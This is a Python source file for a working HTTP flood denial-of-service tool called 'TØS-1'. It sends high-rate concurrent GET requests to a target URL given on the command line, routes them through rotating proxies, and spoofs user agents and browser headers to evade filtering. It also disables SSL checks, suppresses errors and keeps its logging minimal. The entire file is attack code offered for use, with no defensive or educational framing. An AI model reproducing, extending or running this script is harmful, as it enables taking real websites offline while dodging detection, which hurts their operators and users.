import asyncio
import aiohttp
import random
import time
import os
import sys

class TOS1:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session_id = "S023"
        self.total_requests = 0
        self.running = True
        self.attack_active = True
        self.start_time = time.time()
        
        # Load resources
        self.proxies = self.load_file("main.txt")
        self.user_agents = self.load_file("ua.txt")
        
        # Headers rotation
        self.headers_pool = self.generate_real_headers()
        self.current_headers = {}
        self.current_proxy = ""
        self.current_ua = ""
        
        # Concurrency control (no CPU monitoring)
        self.concurrency = 500
        self.semaphore = asyncio.Semaphore(self.concurrency)
        
        # Session
        self.session = None
        
    def load_file(self, filename):
        """Load lines from file"""
        try:
            with open(filename, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except:
            return []
    
    def generate_real_headers(self):
        """Generate realistic looking headers"""
        return [
            {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Cache-Control': 'max-age=0'
            },
            {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin'
            }
        ]
    
    def rotate_resources(self):
        """Rotate proxy, UA, and headers"""
        if self.proxies:
            self.current_proxy = random.choice(self.proxies)
        
        if self.user_agents:
            self.current_ua = random.choice(self.user_agents)
        
        self.current_headers = random.choice(self.headers_pool).copy()
        if self.current_ua:
            self.current_headers['User-Agent'] = self.current_ua
    
    async def create_session(self):
        """Create aiohttp session"""
        connector = aiohttp.TCPConnector(limit=0, force_close=True)
        timeout = aiohttp.ClientTimeout(total=5)
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout
        )
    
    async def send_request(self):
        """Send single request"""
        if not self.session or not self.attack_active:
            return
        
        async with self.semaphore:
            try:
                proxy_url = f"http://{self.current_proxy}" if self.current_proxy else None
                
                async with self.session.get(
                    self.target_url,
                    headers=self.current_headers,
                    proxy=proxy_url,
                    ssl=False
                ) as response:
                    await response.read()
                    
            except:
                pass  # Silent fail
            
            finally:
                self.total_requests += 1
    
    def update_display(self):
        """Update display - ONLY THIS LOGGING"""
        sys.stdout.write(f"\rTØS-1 — {self.total_requests} | {{S023}}")
        sys.stdout.flush()
    
    async def maintenance(self):
        """Perform maintenance every 15 minutes"""
        while self.running:
            current_time = time.time()
            
            if current_time - self.last_maintenance >= 900:  # 15 minutes
                self.attack_active = False
                
                # Close old session
                if self.session:
                    await self.session.close()
                    self.session = None
                
                # Clear and rotate resources
                self.rotate_resources()
                
                # Create new session
                await self.create_session()
                
                # Wait a moment
                await asyncio.sleep(2)
                
                self.attack_active = True
                self.last_maintenance = current_time
            
            await asyncio.sleep(1)
    
    async def attack_loop(self):
        """Main attack loop"""
        await self.create_session()
        self.rotate_resources()
        self.last_maintenance = time.time()
        
        # High RPS loop
        while self.running and self.attack_active:
            # Send batch of requests
            tasks = []
            for _ in range(min(self.concurrency, 50)):
                tasks.append(self.send_request())
            
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
            
            self.update_display()
            
            # Small delay
            await asyncio.sleep(0.0001)
    
    async def run(self):
        """Main run method"""
        # Initial display
        print("𝖳Ø𝖲-1 | 𝖲023")
        await asyncio.sleep(2)
        os.system('clear')
        
        # Start maintenance in background
        maintenance_task = asyncio.create_task(self.maintenance())
        
        # Start attack
        try:
            await self.attack_loop()
        except KeyboardInterrupt:
            self.running = False
        finally:
            maintenance_task.cancel()
            if self.session:
                await self.session.close()
            
            # NO FINAL STATS - just exit
            sys.exit(0)

# Main execution
if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(1)
    
    target = sys.argv[1]
    
    # Check for required files
    if not os.path.exists("main.txt"):
        # Create empty if doesn't exist (will run without proxies)
        with open("main.txt", "w") as f:
            pass
    
    if not os.path.exists("ua.txt"):
        # Create default UAs
        with open("ua.txt", "w") as f:
            f.write("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\n")
            f.write("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36\n")
    
    tos = TOS1(target)
    
    # Run
    asyncio.run(tos.run())
